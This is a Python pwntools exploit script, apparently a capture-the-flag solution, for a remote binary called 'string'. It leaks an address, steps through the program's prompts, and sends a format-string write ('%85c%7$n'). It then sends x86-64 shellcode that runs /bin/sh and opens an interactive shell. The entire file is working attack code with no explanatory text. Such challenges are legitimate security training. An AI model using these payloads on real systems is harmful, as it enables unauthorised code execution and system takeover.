from pwn import *

#n = process('./string')
n = remote('111.198.29.45',43380)
elf = ELF('./string')
context.log_level = 'debug'

n.recvuntil('secret[0] is ')
v3_addr = int(n.recvuntil('\n')[:-1],16)
print(hex(v3_addr))
n.recvuntil('name be:\n')
n.sendline('a')
n.recvuntil('up?:')
n.sendline('east')
n.recvuntil('leave(0)?:')
n.sendline('1')
n.recvuntil("address'")
n.sendline(str(v3_addr))
n.recvuntil('is:')
n.sendline("%85c%7$n")
n.recvuntil('USE YOU SPELL')
n.sendline("\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")
n.interactive()
